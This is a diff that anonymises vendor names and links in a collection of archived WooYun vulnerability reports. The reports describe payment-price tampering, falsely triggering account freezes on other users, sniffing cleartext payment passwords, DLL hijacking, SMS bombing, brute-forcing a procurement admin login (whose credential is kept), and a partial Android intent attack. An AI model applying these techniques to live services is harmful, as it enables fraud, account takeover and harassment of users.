 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发送不良的文件给QQ好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的QQ冻结掉我的博客http://www.chinanaizui.com/
+**详情**: 发送不良的文件给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的某互联网公司冻结掉我的博客https://example.com/[已脱敏]
 
-**POC**: 然后发送给QQ好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方QQ号码就被冻结如图差不多15分钟到30分钟就搞定了
+**POC**: 然后发送给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方某互联网公司号码就被冻结如图差不多15分钟到30分钟就搞定了
 
 **绕过**: 直接利用
 
-**修复**: 腾讯懂的
+**修复**: 某互联网公司懂的
 ---
 
 ---
@@ -14889,7 +14889,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转支付宝
+**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转某电商平台
 
 **POC**: 如上
 
@@ -14899,8 +14899,8 @@
 ---
 
 ---
-### [wooyun-2013-042349] 安卓新浪微博客户端内支付宝支付方式隐私泄漏(可被中间人）
-**厂商**: 支付宝 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-042349] 安卓某社交平台某社交平台客户端内某电商平台支付方式隐私泄漏(可被中间人）
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14911,13 +14911,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 安卓新浪微博手机客户端内，可以选择购买会员，选择支付方式的时候选择支付宝支付就会跳转到支付宝的支付页面，在支付页面需要输入支付宝帐号和支付密码，注意是支付密码，但是支付宝页面在传输帐号和支付密码时用的是http协议明文传输。简单的中间人攻击就可以看到用户输入的支付宝帐号和密码。
+**详情**: 安卓某社交平台某社交平台手机客户端内，可以选择购买会员，选择支付方式的时候选择某电商平台支付就会跳转到某电商平台的支付页面，在支付页面需要输入某电商平台帐号和支付密码，注意是支付密码，但是某电商平台页面在传输帐号和支付密码时用的是http协议明文传输。简单的中间人攻击就可以看到用户输入的某电商平台帐号和密码。
 
-**POC**: 可以看到，是从新浪微博支付会员页面选择支付宝支付进入支付宝页面的。跳转到支付宝页面后，输入支付宝的帐号和支付密码。这里输入的帐号和密码很容易被攻击者获取。下图是进行中间人攻击拦截到的一些流量。该图显示此时是在支付宝的页面上alipay该图显示支付宝页面在传输帐号和支付密码时用的是http协议明文传输。右侧红框内分别是支付宝的帐号和密码，均为明文。简单的中间人攻击就可以看到这样的信息，泄漏隐私，非常危险。
+**POC**: 可以看到，是从某社交平台某社交平台支付会员页面选择某电商平台支付进入某电商平台页面的。跳转到某电商平台页面后，输入某电商平台的帐号和支付密码。这里输入的帐号和密码很容易被攻击者获取。下图是进行中间人攻击拦截到的一些流量。该图显示此时是在某电商平台的页面上alipay该图显示某电商平台页面在传输帐号和支付密码时用的是http协议明文传输。右侧红框内分别是某电商平台的帐号和密码，均为明文。简单的中间人攻击就可以看到这样的信息，泄漏隐私，非常危险。
 
 **绕过**: 直接利用
 
-**修复**: 在支付页面传输信息时采用SSL协议加密传输，而不是用http协议直接传输。或者调用手机安装的支付宝钱包客户端进行支付。
+**修复**: 在支付页面传输信息时采用SSL协议加密传输，而不是用http协议直接传输。或者调用手机安装的某电商平台钱包客户端进行支付。
 ---
 
 ---
@@ -14965,8 +14965,8 @@
 ---
 
 ---
-### [wooyun-2012-07293] 淘宝网某处存在严重支付漏洞
-**厂商**: 淘宝网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-07293] 某电商平台网某处存在严重支付漏洞
+**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -15045,7 +15045,7 @@
 
 **详情**: 大体流程是这样的:1.注册com对象到word2.调用CreateDispatch(_T("Word.Application"))触发dump动作（因为只有这样才能做到悄无声息）,生成注册表services里minipoc3.驱动里修改了IE主页，当然,到驱动的就全过了4.同时根据前段时间提的信息不对称检测漏洞，驱动启动的时候会自删除绕过扫描检测。而我又懒得再回写了，因此只在重启第一次的时候有效.
 
-**POC**: 测试前最好先检查默认IE主页演示POC程序地址：http://pan.baidu.com/share/link?shareid=1624884298&uk=2919236042http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/12/Plug-BYpass.rar想重复测试就手动删除systemroot/minipoc.sys
+**POC**: 测试前最好先检查默认IE主页演示POC程序地址：https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -15141,8 +15141,8 @@
 ---
 
 ---
-### [wooyun-2011-03839] 手机QQ隐身可查看
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03839] 手机某互联网公司隐身可查看
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -15153,7 +15153,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 查看好友资料时，好友虽然已经隐身，但是在查看标签和印象时，出现一个"对方正在使用的版本不支持此功能”的提示，说明这个好友正在使用手机登录QQ，并且在线。
+**详情**: 查看好友资料时，好友虽然已经隐身，但是在查看标签和印象时，出现一个"对方正在使用的版本不支持此功能”的提示，说明这个好友正在使用手机登录某互联网公司，并且在线。
 
 **POC**: (见原文)
 
@@ -15229,8 +15229,8 @@
 ---
 
 ---
-### [wooyun-2013-037499] 腾讯视频客户端多处DLL劫持（系统目录DLL）
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037499] 某互联网公司视频客户端多处DLL劫持（系统目录DLL）
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15241,7 +15241,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试时腾讯视频客户端的安装路径为：C:\Program Files\Tencent\QQLive\打开QQLive.exe时会加载四处不存在的DLL文件.打开腾讯视频客户端时加载如下不存在的DLLC:\WINDOWS\system32\kernelbase.dllC:\Program Files\Tencent\QQLive\idframe.dll播放时加载如下不存在的DLLC:\Program Files\Tencent\QQLive\quserex.dll退出客户端时加载如下不存在的DLLC:\Program Files\Tencent\QQLive\diagnosis.dll以上任一DLL文件与QQLive.exe放在对应的目录，这样就可以在运行QQLive.exe的时候会同时加载对应的DLL，这个DLL可以为自制的任意内容的dll。此方法可用于劫持运行某些程序（木马病毒）。（我这里
+**详情**: 测试时某互联网公司视频客户端的安装路径为：C:\Program Files\Tencent\某互联网公司Live\打开某互联网公司Live.exe时会加载四处不存在的DLL文件.打开某互联网公司视频客户端时加载如下不存在的DLLC:\WINDOWS\system32\kernelbase.dllC:\Program Files\Tencent\某互联网公司Live\idframe.dll播放时加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Live\quserex.dll退出客户端时加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Live\diagnosis.dll以上任一DLL文件与某互联网公司Live.exe放在对应的目录，这样就可以在运行某互联网公司Live.exe的时候会同时加载对应的DLL，这个DLL可以为自制的任意内容的dll。此方法可用于劫持运行某些程序（木马病毒）。（我这里
 
 **POC**: (见原文)
 
@@ -15273,8 +15273,8 @@
 ---
 
 ---
-### [wooyun-2012-015301] 腾讯QQ客户端某功能设计存在严重缺陷。
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-015301] 某互联网公司某互联网公司客户端某功能设计存在严重缺陷。
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15285,9 +15285,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯QQ客户端聊天记录漫游功能机制存在问题，笔者在另一台电脑上测试QQ漫游记录功能，无需对用户密保进行认证可直接设置QQ漫游聊天记录独立密码功能。危害：一旦用户密码泄露，若用户未设置其独立密码功能，可直接设置用户聊天记录独立密码，非会员可造成泄露所有好友1周聊天记录，QQ会员则会泄露1个月聊天记录信息。如果用户使用QQ进行商务办公、亲友聊天等等，包含在聊天记录中的敏感信息一旦泄露，可对用户自身造成重大影响。亲，你还在使用QQ聊隐私信息吗啊？
+**详情**: 某互联网公司某互联网公司客户端聊天记录漫游功能机制存在问题，笔者在另一台电脑上测试某互联网公司漫游记录功能，无需对用户密保进行认证可直接设置某互联网公司漫游聊天记录独立密码功能。危害：一旦用户密码泄露，若用户未设置其独立密码功能，可直接设置用户聊天记录独立密码，非会员可造成泄露所有好友1周聊天记录，某互联网公司会员则会泄露1个月聊天记录信息。如果用户使用某互联网公司进行商务办公、亲友聊天等等，包含在聊天记录中的敏感信息一旦泄露，可对用户自身造成重大影响。亲，你还在使用某互联网公司聊隐私信息吗啊？
 
-**POC**: 具体测试过程如下：1.常用地:北京测试QQ：4XXXXXX二代密保+QQ会员。测试环境为QQ2012正式版首先我们直接打开一个聊天框，选择聊天记录，漫游消息。直接跳出设置聊天记录独立密码。为了证明真实性，测试QQ登陆QQ安全中心(aq.qq.com),页面显示二代密保，手机和邮箱均为绑定。具体测试过程，好友本地消息显示聊天记录为一页，我们直接设置了一个长达15位的密码。即可直接获取到与好友1个月的聊天记录，并且系统提示：尊敬的QQ会员，已为您漫游全体好友30天的消息记录，您还可以永久漫游与该好友的消息记录。具体危害，大家可以想象的到，后文会提到具体利用过程。QQ会员2代密保测试结果，成功!！！
+**POC**: 具体测试过程如下：1.常用地:北京测试某互联网公司：4XXXXXX二代密保+某互联网公司会员。测试环境为某互联网公司2012正式版首先我们直接打开一个聊天框，选择聊天记录，漫游消息。直接跳出设置聊天记录独立密码。为了证明真实性，测试某互联网公司登陆某互联网公司安全中心(aq.某互联网公司.com),页面显示二代密保，手机和邮箱均为绑定。具体测试过程，好友本地消息显示聊天记录为一页，我们直接设置了一个长达15位的密码。即可直接获取到与好友1个月的聊天记录，并且系统提示：尊敬的某互联网公司会员，已为您漫游全体好友30天的消息记录，您还可以永久漫游与该好友的消息记录。具体危害，大家可以想象的到，后文会提到具体利用过程。某互联网公司会员2代密保测试结果，成功!！！
 
 **绕过**: 直接利用
 
@@ -15361,8 +15361,8 @@
 ---
 
 ---
-### [wooyun-2012-04344] QQ2011及之前版本隐藏快捷键冲突，导致用户错按后，群窗口无故退出
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-04344] 某互联网公司2011及之前版本隐藏快捷键冲突，导致用户错按后，群窗口无故退出
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15373,7 +15373,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 重现OS:windows xp/vista/7 中文版 均可重现步骤：1、打开qq20112、进入任意QQ群3、在群聊窗口下，按下键盘组合键：alt+i+t4、在当前群发任意信息（文字、图片、混合均可）5、BUG出现。发送信息后，当前QQ群窗口会自动关闭6、再打开该QQ群7、BUG依旧PS:之所以是BUG，是因为QQ在帮助文件和设置选项中，都没有对ALT+I+T这个组合键做任何的解释说明。但是一旦按了之后，对应的QQ群都将出现自动关闭的情况，重装QQ无效。临时解决方法（针对用户的）在出现问题的QQ群窗口下，再次按ALT+I+T bug消失。
+**详情**: 重现OS:windows xp/vista/7 中文版 均可重现步骤：1、打开某互联网公司20112、进入任意某互联网公司群3、在群聊窗口下，按下键盘组合键：alt+i+t4、在当前群发任意信息（文字、图片、混合均可）5、BUG出现。发送信息后，当前某互联网公司群窗口会自动关闭6、再打开该某互联网公司群7、BUG依旧PS:之所以是BUG，是因为某互联网公司在帮助文件和设置选项中，都没有对ALT+I+T这个组合键做任何的解释说明。但是一旦按了之后，对应的某互联网公司群都将出现自动关闭的情况，重装某互联网公司无效。临时解决方法（针对用户的）在出现问题的某互联网公司群窗口下，再次按ALT+I+T bug消失。
 
 **POC**: (见原文)
 
@@ -15417,9 +15417,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站地址http://www.banyou.com购买地址http://www.banyou.com/user/alipayvip.asp先到支付界面，随便选个最贵的吧然后抓包，发现了吧，改下参数。19999改成0.01然后直接提交跳到这个页面了吧。直接支付宝付款吧恩。。。付款吧。然后就是会员了。没有恶意。求退还一分钱····
+**详情**: 网站地址https://example.com/[已脱敏]
 
-**POC**: 先到支付界面，随便选个最贵的吧然后抓包，发现了吧，改下参数。19999改成0.01然后直接提交跳到这个页面了吧。直接支付宝付款吧恩。。。付款吧。然后就是会员了。没有恶意。求退还一分钱····
+**POC**: 先到支付界面，随便选个最贵的吧然后抓包，发现了吧，改下参数。19999改成0.01然后直接提交跳到这个页面了吧。直接某电商平台付款吧恩。。。付款吧。然后就是会员了。没有恶意。求退还一分钱····
 
 **绕过**: 直接利用
 
@@ -15427,8 +15427,8 @@
 ---
 
 ---
-### [wooyun-2014-082848] 携程某接口接口缺陷可撞库（已测试部分数据）及短信轰炸
-**厂商**: 携程旅行网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-082848] 某旅游平台某接口接口缺陷可撞库（已测试部分数据）及短信轰炸
+**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -15439,7 +15439,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: BUG1、问题接口：https://accounts.ctrip.com/globalwap/account/login/基本上其他国家的WAP页面登陆口都在这里进行验证的，但是没做任何的限制登录时抓取数据包：POST /globalwap/account/login/ HTTP/1.1Host: accounts.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, de
+**详情**: BUG1、问题接口：https://example.com/[已脱敏] /globalwap/account/login/ HTTP/1.1Host: accounts.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, de
 
 **POC**: (见原文)
 
@@ -15493,8 +15493,8 @@
 ---
 
 ---
-### [wooyun-2012-05420] 腾讯 QQ、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-05420] 某互联网公司 某互联网公司、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -15505,13 +15505,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯 QQ、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击腾讯 QQ、TM 聊天窗口远程读取对方进程内存数据漏洞、可导致远程溢出、拒绝服务攻击漏洞描述：这个我也不知道该下个什么定义、叫个什么名字好，暂且叫这个名字吧……这个漏洞挺狗血的，发现过程也很巧合。话说本站部分连接被伟大的GFW屏蔽了，所以在早上的时候，我把链接统一改成了一个很猥琐的格式……例如：http://lcx.cc/?$=1910，（因为存在一些兼容问题，现在已经改成其他的了……）然后，下午的时候，在群里发了链接，然后紧接着很多人反映QQ崩溃、或是无法访问！如下图：然后我很好奇，于是乎手动检查了下，发现了个奇怪的问题，如下图：很明显，打开的 Url 地址完全错误！并且后边多了一串奇怪的字符……这顿时勾起了我的兴趣，于是乎把玩了一番，得出了如下结论……漏洞测试：测试环境：TM2009 Beta3.2 + IE9 + W
+**详情**: 某互联网公司 某互联网公司、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击某互联网公司 某互联网公司、TM 聊天窗口远程读取对方进程内存数据漏洞、可导致远程溢出、拒绝服务攻击漏洞描述：这个我也不知道该下个什么定义、叫个什么名字好，暂且叫这个名字吧……这个漏洞挺狗血的，发现过程也很巧合。话说本站部分连接被伟大的GFW屏蔽了，所以在早上的时候，我把链接统一改成了一个很猥琐的格式……例如：https://example.com/[已脱敏] Url 地址完全错误！并且后边多了一串奇怪的字符……这顿时勾起了我的兴趣，于是乎把玩了一番，得出了如下结论……漏洞测试：测试环境：TM2009 Beta3.2 + IE9 + W
 
-**POC**: 卧槽，实在是太长了，尼玛复制还不带自动复制图片的，靠……这是链接：http://lcx.cc/?i=2349晕
+**POC**: 卧槽，实在是太长了，尼玛复制还不带自动复制图片的，靠……这是链接：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 腾讯自有方案……
+**修复**: 某互联网公司自有方案……
 ---
 
 ---
@@ -15529,7 +15529,7 @@
 
 **详情**: 同程工程师估计太忙，上次提交的漏洞只修改了部分WooYun: 同程旅交汇低价支付高价订单订单随意修改（另种支付漏洞隐患）其中修改lineid达到修改订单金额的地方反而没有修改，不知道是因为该地方不构成威胁还是另有原因，因为厂家已经公开了漏洞，既然看到了就再提一下吧，以免是因为疏漏忘记修改导致问题。
 
-**POC**: http://www.17u.net/WDHandler/LineOrder.ashx?action=updateLine&Platform=net&lineid=4593689&b2bMemberId=207967&TotalPrice=2750.00&TotalMan=1&TotalChild=0&b2cname=13111112343&b2cphone=13111112343&b2cemail=&remark=&dateText=2015-3-19%200:00:00&orderid=254831修改Lineid和totalprice，可以修改订单金额和支付金额
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15593,7 +15593,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信端 江苏国寿微助理点击然后 个人管理或者其他的都行会跳转到登陆我首先用8位的员工号来爆破发现是132开头的 那么我们只需要对132xxxxx的xxxxx进行爆破就可以了简单的爆破了下 6000员工！！！然后我来演示下 如何获取他的姓名信息输入手机号和验证码以后 点击获取验证码而且验证码还直接返回了！！！点到为止 不深入了
+**详情**: 某互联网公司端 江苏国寿微助理点击然后 个人管理或者其他的都行会跳转到登陆我首先用8位的员工号来爆破发现是132开头的 那么我们只需要对132xxxxx的xxxxx进行爆破就可以了简单的爆破了下 6000员工！！！然后我来演示下 如何获取他的姓名信息输入手机号和验证码以后 点击获取验证码而且验证码还直接返回了！！！点到为止 不深入了
 
 **POC**: (见原文)
 
@@ -15603,7 +15603,7 @@
 ---
 
 ---
-### [wooyun-2015-0129904] 滴滴专车产品逻辑漏洞(导致可完全免费乘坐专车)
+### [wooyun-2015-0129904] 某出行平台专车产品逻辑漏洞(导致可完全免费乘坐专车)
 **厂商**: 小桔科技 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -15615,7 +15615,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用大号邀请阿里小号注册滴滴专车填入阿里小号手机号
+**详情**: 用大号邀请阿里小号注册某出行平台专车填入阿里小号手机号
 
 **POC**: 可以得到相应代金券可以无限次累计获得
 
@@ -15659,7 +15659,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 话说在微博认识了@beiju886 苏可可妹子。是和推女郎有合作。然后这期推出了可可的写真。抱着友好的心态进行测试（前几天就想了。猜是99%的几率可以成功）
+**详情**: 话说在某社交平台认识了@beiju886 苏可可妹子。是和推女郎有合作。然后这期推出了可可的写真。抱着友好的心态进行测试（前几天就想了。猜是99%的几率可以成功）
 
 **POC**: 看出有问题了直接get过去就好我的一毛能能报销吗？= =我已经没有继续下了。。不信可以看服务器日志。
 
@@ -15670,7 +15670,7 @@
 
 ---
 ### [wooyun-2013-028647] 阿里旺旺多个漏洞集合(dll劫持，可信路径问题以及拒绝服务等）
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15683,7 +15683,7 @@
 
 **详情**: 1、阿里旺旺几个低危Dll 劫持，不能导致远程代码执行，不过可能被病毒用来恶意启动2、阿里旺旺自定义主题拒绝服务3、阿里旺旺可信任路径漏洞
 
-**POC**: 1、TBBrowserDownload.exe启动加载不存在的dwmapi.dll，AliIM.exe启动加载不存在的dwmapi.dll,wwutils.dll2、阿里旺旺自定义主题，当诱使用户使用畸形png图片当主题，可导致拒绝服务攻击3、阿里旺旺自定义主题，点击“更多主题”会导致可信任路径漏洞4、poc见http://pan.baidu.com/share/link?shareid=2718244113&uk=1462810413ps：这么多个漏洞，多给几分呗
+**POC**: 1、TBBrowserDownload.exe启动加载不存在的dwmapi.dll，AliIM.exe启动加载不存在的dwmapi.dll,wwutils.dll2、阿里旺旺自定义主题，当诱使用户使用畸形png图片当主题，可导致拒绝服务攻击3、阿里旺旺自定义主题，点击“更多主题”会导致可信任路径漏洞4、poc见https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15692,7 +15692,7 @@
 
 ---
 ### [wooyun-2013-043276] 来往软件惊现时光倒流事件！大家都做预言帝！
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15705,7 +15705,7 @@
 
 **详情**: 昨天偶然间发现的洞，模块是安卓版的来往的分享功能。当然，我不知道苹果版有没有同样的问题，因为俺没有苹果手机，ipad也没有。听说来往挖洞送ipad，我就仅仅要个ipadmini就好了。俺的安卓手机系统时间错乱了，俺也懒得校对。不过，然后测试来往的分享功能的时候，奇迹就发生了，下面就是poc，详情见图~
 
-**POC**: 见图，俺于11月8号就成功的预言了11月11日淘宝的销售额是350亿，是不是很牛逼的赶脚？哈哈~~
+**POC**: 见图，俺于11月8号就成功的预言了11月11日某电商平台的销售额是350亿，是不是很牛逼的赶脚？哈哈~~
 
 **绕过**: 直接利用
 
@@ -15713,8 +15713,8 @@
 ---
 
 ---
-### [wooyun-2015-0109171] 百度财富Android客户端设计缺陷可清除手势密码
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0109171] 某搜索引擎财富Android客户端设计缺陷可清除手势密码
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -15725,7 +15725,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.手势密码的产生一般是为了解决用户手机不在手上或者遗失时避免被人直接登录帐号，造成资金损失，百度财富客户端支持启用手势密码，但这个保护用户资金安全的功能设计上却有不少缺陷~2.百度财富开启手势密码后，会保存用户设置的手势密码在/data/data/com.baidu.vsfinance/filesgesture_lock.obj 文件中3.仔细看两眼就会发现，手势密码其实是明文保存的，最后的x前的几位数字就是用户的手势密码
+**详情**: 1.手势密码的产生一般是为了解决用户手机不在手上或者遗失时避免被人直接登录帐号，造成资金损失，某搜索引擎财富客户端支持启用手势密码，但这个保护用户资金安全的功能设计上却有不少缺陷~2.某搜索引擎财富开启手势密码后，会保存用户设置的手势密码在/data/data/com.baidu.vsfinance/filesgesture_lock.obj 文件中3.仔细看两眼就会发现，手势密码其实是明文保存的，最后的x前的几位数字就是用户的手势密码
 
 **POC**: 4.测试发现：只要修改此文件或者直接删除此文件就能清除手势密码（需要ROOT权限，但手势密码是争对手机不在用户手上的情况的，ROOT是分分钟的事，所以没啥利用条件）
 
@@ -15769,9 +15769,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国图书网在线支付漏洞，购买订单传送给手机支付平台时用的是http协议，未做加密处理，可以抓包直接修改数据。注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到中国移动和包支付，显示9.8元。直接支付就可以了~~
+**详情**: 中国图书网在线支付漏洞，购买订单传送给手机支付平台时用的是http协议，未做加密处理，可以抓包直接修改数据。注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到某运营商和包支付，显示9.8元。直接支付就可以了~~
 
-**POC**: 注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到中国移动和包支付，显示9.8元。直接支付就可以了。
+**POC**: 注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到某运营商和包支付，显示9.8元。直接支付就可以了。
 
 **绕过**: 直接利用
 
@@ -15779,8 +15779,8 @@
 ---
 
 ---
-### [wooyun-2015-0153783] 中国联通某平台设计逻辑缺陷可进后台
-**厂商**: 中国联通 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0153783] 某运营商某平台设计逻辑缺陷可进后台
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -15791,9 +15791,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 为中国联通采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样
+**详情**: 为某运营商采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样
 
-**POC**: 为中国联通采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样
+**POC**: 为某运营商采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样
 
 **绕过**: 直接利用
 
@@ -15867,8 +15867,8 @@
 ---
 
 ---
-### [wooyun-2013-038776] 中国电信某分站某处验证绕过可进行无限短信轰炸
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-038776] 某运营商某分站某处验证绕过可进行无限短信轰炸
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -15879,7 +15879,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.189180.net/ComIndex/Register获取短信验证码处没有进行限制，短信可以无限重复发送到同一号码实现轰炸，没有限制条数。Burp抓包，repeat测试可知一分钟40条无压力。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15901,7 +15901,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yaofang.cn/a/user/Show_Pass本来是需要输入原密码并验证正确才能修改密码，但是这里的验证逻辑存在问题，导致可以使用任意密码修改，测试时这里不接受GET请求，不然可以弄出CSRF输入任意密码，拦截返回包修改返回包为1，在前一次修改时输入的密码正确修改为1，则页面显示正确接下来输入新密码即可重置成功重置，退出，用修改的密码可成功登录
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 这个漏洞利用需要用户登录，可以用在被XSS后或者其他情况这里只证明问题存在
 
@@ -15977,8 +15977,8 @@
 ---
 
 ---
-### [wooyun-2013-038158] 百度手机浏览器缺陷可导致用户敏感数据泄漏(Android系统webkit内核问题t5内核浏览器无影响)
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-038158] 某搜索引擎手机浏览器缺陷可导致用户敏感数据泄漏(Android系统webkit内核问题t5内核浏览器无影响)
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -15989,7 +15989,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Android平台百度手机浏览器最新版恶意APP攻击代码：恶意APP可以先释放attack.html，然后打开SD卡中的恶意attack.html......public Intent getIntentForSE(String url) {Intent intent = new Intent("android.intent.action.VIEW");intent.setClassName("com.baidu.browser.apps", "com.baidu.browser.framework.BdBrowserActivity");intent.setData(Uri.parse(url));return intent;}try {String url = "file:///mnt/sdcard/attack.html";Intent intent1 = getIntentForS
